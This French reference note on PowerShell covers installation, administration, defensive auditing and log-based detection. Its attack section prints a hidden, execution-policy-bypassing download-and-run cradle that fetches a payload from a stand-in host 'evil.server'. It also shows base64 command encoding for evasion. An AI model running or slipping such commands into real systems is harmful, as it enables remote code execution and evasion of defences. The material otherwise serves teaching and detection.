---
aliases:
  - PowerShell
  - Shell PowerShell
  - PS
  - Windows PowerShell
  - PowerShell Core
archetype: outil
site_web:
  - https://learn.microsoft.com/fr-fr/powershell/
langage:
  - PowerShell
cssclasses:
  - max
tags:
  - langage/powershell
  - microsoft
  - administration/systeme
  - automatisation
  - gestion-configuration
  - cybersecurite
  - attaque
  - exploitation
  - reconnaissance
  - os/windows
  - distribution/gnu-linux
  - os/macos
  - shell
  - framework
  - commande
---

# PowerShell

> [!abstract] Description
> **PowerShell** est un *shell de ligne de commande* multiplateforme, un *langage de script* et un *framework de gestion de configuration* développé par Microsoft. Il est conçu pour automatiser les tâches d'administration système et de gestion de la configuration, et il est particulièrement puissant pour interagir avec les API et les systèmes Windows, mais est également disponible sur Linux et macOS. Il est utilisé par les administrateurs système, les ingénieurs DevOps et les professionnels de la cybersécurité pour la gestion, l'automatisation, l'analyse et l'orchestration des systèmes.

## ⚡ Cheat Sheet Express
> [!tip] Commandes Vitales
> ```powershell
> # Afficher l'aide pour un cmdlet spécifique
> Get-Help Get-Service
> 
> # Lister tous les cmdlets disponibles
> Get-Command
> 
> # Obtenir une liste des services en cours d'exécution
> Get-Service | Where-Object {$_.Status -eq 'Running'}
> 
> # Obtenir les informations détaillées sur un processus par son nom
> Get-Process -Name "chrome" | Format-List *
> ```

## 📦 Installation

PowerShell est préinstallé sur la plupart des versions récentes de Windows. Pour les autres plateformes ou pour installer la dernière version de PowerShell Core (maintenant simplement appelée PowerShell), suivez les instructions ci-dessous.

```bash
# Windows (Installation de la version la plus récente - PowerShell 7+)
# Ouvrir PowerShell en tant qu'administrateur et exécuter :
# Utilisation de Winget (si disponible)
winget install --id Microsoft.PowerShell --source winget

# Ou téléchargement direct depuis GitHub (MSI)
# Rendez-vous sur https://github.com/PowerShell/PowerShell/releases pour le fichier .msi

# Debian/Kali (Installation de PowerShell 7+)
# 1. Mettre à jour les paquets et installer les dépendances
sudo apt update && sudo apt install -y curl gnupg apt-transport-https

# 2. Importer la clé de signature publique de Microsoft GPG
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -

# 3. Enregistrer le référentiel Microsoft Ubuntu 20.04 (Focal) - compatible Debian
sudo sh -c 'echo "deb [arch=amd64] https://packages.microsoft.com/ubuntu/20.04/prod focal main" > /etc/apt/sources.list.d/microsoft.list'

# 4. Mettre à jour les listes de paquets et installer powershell
sudo apt update
sudo apt install -y powershell

# Lancer PowerShell
pwsh

# macOS (Installation via Homebrew)
brew install powershell --cask
```

## ⚙️ Cas d'usage Détaillés

### 1. Administration Système : Gestion des Services Windows
PowerShell simplifie la gestion des services, permettant de lister, démarrer, arrêter ou redémarrer des services avec des commandes intuitives.

```powershell
# Démarrer un service spécifique (ex: Spouleur d'impression)
Start-Service -Name "Spooler"

# Arrêter un service et confirmer
Stop-Service -Name "BITS" -Confirm

# Redémarrer un service
Restart-Service -Name "WSearch"

# Obtenir les services dont le statut de démarrage est manuel
Get-Service | Where-Object {$_.StartType -eq "Manual"}
```

### 2. Administration Système : Gestion des Processus et Ressources
Les cmdlets PowerShell permettent de surveiller et de manipuler les processus en cours d'exécution, d'identifier les ressources consommées et de résoudre les problèmes de performance.

```powershell
# Lister les 5 processus qui consomment le plus de CPU
Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 5 -Property ProcessName, CPU, WorkingSet

# Arrêter un processus par son ID
Stop-Process -Id 1234 -Force

# Lancer un nouveau processus (ex: Notepad)
Start-Process -FilePath "notepad.exe"
```

### 3. Cybersécurité (Attaque) : Exécution de Commandes Obfuscquées et Téléchargement de Payloads
Les attaquants utilisent fréquemment PowerShell en raison de sa présence omniprésente sur les systèmes Windows et de sa capacité à exécuter du code à distance ou en mémoire. L'obfuscation et l'encodage permettent de contourner les détections.

```powershell
# Télécharger et exécuter un script PowerShell distant en mémoire (souvent utilisé par les frameworks d'attaque comme Empire/Covenant)
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object System.Net.WebClient).DownloadString('http://evil.server/payload.ps1')"

# Exécuter une commande encodée en Base64 pour cacher l'intention réelle
# Exemple : whoami encodé en Base64
$encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami"))
powershell.exe -EncodedCommand $encodedCommand
```

### 4. Cybersécurité (Attaque) : Reconnaissance Interne et Collecte d'Informations
PowerShell est un outil puissant pour la reconnaissance au sein d'un réseau compromis, permettant de collecter des informations sur les utilisateurs, les groupes, les configurations réseau et les systèmes.

```powershell
# Lister les membres du groupe "Administrators" local
Get-LocalGroupMember -Group "Administrators"

# Récupérer les informations réseau détaillées (nécessite le module NetAdapter)
Get-NetAdapter | Select-Object Name, MacAddress, Status, LinkSpeed

# Lister les partages réseau accessibles sur le système local
Get-SmbShare

# Collecter des informations sur le système d'exploitation et l'architecture
Get-ComputerInfo | Select-Object OsName, OsVersion, OsArchitecture
```

### 5. Cybersécurité (Défense) : Audit de Configuration de Sécurité
Les défenseurs peuvent utiliser PowerShell pour automatiser l'audit des configurations de sécurité, vérifier la conformité et identifier les vulnérabilités potentielles.

```powershell
# Vérifier la politique d'exécution de PowerShell (doit être Restricted ou AllSigned sur les systèmes sensibles)
Get-ExecutionPolicy

# Lister les comptes utilisateurs locaux avec des privilèges élevés
Get-LocalUser | Where-Object {$_.Enabled -eq $true -and $_.Description -like "*admin*"}

# Auditer les paramètres du pare-feu Windows
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq "Inbound"}
```

### 6. Cybersécurité (Défense) : Surveillance et Analyse des Journaux d'Événements
PowerShell est essentiel pour la Blue Team afin d'analyser les journaux d'événements Windows, détecter les activités suspectes et automatiser la réponse aux incidents.

```powershell
# Récupérer les 100 dernières entrées du journal de sécurité avec l'ID d'événement 4624 (connexion réussie)
Get-WinEvent -LogName "Security" -MaxEvents 100 -FilterXPath "*[System[(EventID=4624)]]" | Format-Table TimeCreated, Id, @{N='AccountName';E={$_.Properties[5].Value}}, @{N='LogonType';E={$_.Properties[8].Value}}

# Rechercher des exécutions de PowerShell avec des arguments suspects (ex: -EncodedCommand)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Message -like "*-EncodedCommand*"} | Select-Object TimeCreated, Message -First 10

# Collecter les journaux de Script Block Logging (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashTable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Format-Table TimeCreated, Message -AutoSize
```

## ⚠️ Limitations & OPSEC
> [!warning] Attention
> *   **Bruit** : L'exécution de scripts PowerShell peut générer des logs significatifs (via Script Block Logging, Module Logging) et du trafic réseau, ce qui peut alerter les défenseurs. Les attaquants tentent souvent de désactiver ces fonctionnalités ou d'utiliser des techniques d'exécution furtives.
> *   **Détection** : Bien que PowerShell soit puissant, il est également une cible privilégiée pour les solutions de sécurité. Les *Antivirus (AV)*, les *Endpoint Detection and Response (EDR)* et *AMSI (Antimalware Scan Interface)* surveillent l'activité PowerShell pour les patterns malveillants, l'obfuscation et les signatures connues.
> *   **Stabilité** : L'exécution de scripts malveillants ou mal conçus peut potentiellement entraîner une instabilité du système, des plantages d'applications ou des comportements imprévus, bien que PowerShell soit généralement robuste.
> *   **Contournement des politiques d'exécution** : Bien que les politiques d'exécution existent (`Set-ExecutionPolicy`), elles sont des mesures de sécurité faibles et facilement contournables (`-ExecutionPolicy Bypass`).

## 🕵️‍♂️ Détection & Chasse (Blue Team)
Comment repérer l'usage de cet outil dans les logs ?

> [!bug] Artefacts & Signatures
> *   **Processus** : Surveiller les exécutions de `powershell.exe` ou `pwsh.exe` (pour PowerShell Core) avec des arguments suspects tels que :
    *   `-EncodedCommand` : Indique souvent une tentative d'obfuscation.
    *   `-NonInteractive` / `-NoProfile` : Utilisé pour éviter les interactions utilisateur et le chargement de profils standards.
    *   `-WindowStyle Hidden` / `-W Hidden` : Cache la fenêtre de console PowerShell.
    *   `-ExecutionPolicy Bypass` : Tente de contourner la politique d'exécution.
    *   Des chaînes de caractères anormalement longues dans la ligne de commande.
> *   **Réseau** : Surveiller les connexions réseau sortantes initiées par `powershell.exe` ou `pwsh.exe` vers des adresses IP ou des domaines réputés malveillants, ou sur des ports non standards.
> *   **Fichiers** : Recherche de scripts `.ps1` inconnus ou modifiés sur le disque, en particulier dans les répertoires temporaires ou les emplacements inattendus. Les fichiers créés ou modifiés par des scripts PowerShell malveillants.
> *   **Logs Windows** :
    *   **Journal PowerShell (Microsoft-Windows-PowerShell/Operational)** :
        *   **Event ID 4104 (Script Block Logging)** : Enregistre le contenu des blocs de script traités par PowerShell. C'est une source cruciale pour la détection des attaques sans fichier.
        *   **Event ID 4103 (Module Logging)** : Enregistre les commandes exécutées et leurs résultats.
        *   **Event ID 400/401 (Engine State)** : Indique le démarrage et l'arrêt du moteur PowerShell.
    *   **Journal de sécurité (Security)** :
        *   **Event ID 4688 (Process Creation)** : Enregistre la création de processus avec la ligne de commande complète, permettant de voir les arguments passés à `powershell.exe`. (Nécessite une configuration d'audit avancée).
    *   **AMSI (Antimalware Scan Interface)** : Les événements AMSI (souvent trouvés dans les journaux d'événements spécifiques aux antivirus ou au journal "Microsoft-Windows-AMSI/Operational") indiquent quand AMSI a scanné du contenu PowerShell et l'a potentiellement bloqué.